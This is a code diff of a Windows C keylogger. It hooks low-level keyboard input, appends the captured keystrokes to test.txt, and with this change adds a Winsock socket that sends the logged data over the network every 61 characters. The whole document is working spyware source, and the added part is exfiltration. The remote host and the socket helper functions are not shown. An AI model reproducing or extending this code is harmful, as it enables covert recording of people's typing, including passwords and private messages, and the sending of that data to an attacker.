@@ -3,6 +3,8 @@
 ///static HINSTANCE hinst;
 static HHOOK handlekeyboard = NULL;
 
+SOCKET my_sock = INVALID_SOCKET;
+
 const struct keyboard keyboard[] =
 {
 	{ VK_BACK, "[BACK]" },
@@ -134,6 +136,7 @@ void	setwinhook()
 	//hinst = GetModuleHandle(L"chrome.exe");
 	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)) == NULL)
 		return;
+	printf("u\n");
 	CloseHandle(process.hProcess);
 	CloseHandle(process.hThread);
 }
@@ -161,13 +164,12 @@ void	save_data(const char *data)
 	FILE *file;
 	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
 		_wperror(L" Open file failed ");
-
-	_write(_fileno(file), data, strlen(data));
-
+	_write(_fileno(file), data, (unsigned int)strlen(data));
 	if (nbChar == 61)
 	{
 		if (vfprintf_s(file, "\n", NULL) < 0)
 			_wperror(L" Add \\n at the end of the file failed ");
+		send_data(my_sock);
 		nbChar = 0;
 	}
 
@@ -185,7 +187,10 @@ void	save_data(const char *data)
 int	main(void)
 {
 	MSG msg;
-
+	WSADATA wsadata;
+	
+	WSAStartup(MAKEWORD(2, 0), &wsadata);
+	my_sock = init_socket(my_sock);
 	setwinhook();				
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
@@ -193,7 +198,7 @@ int	main(void)
 		DispatchMessage(&msg);
 	}
 	UnhookWindowsHookEx(handlekeyboard);
+	closesocket(my_sock);
+	WSACleanup();
 	return (msg.wParam);
-
-
 }
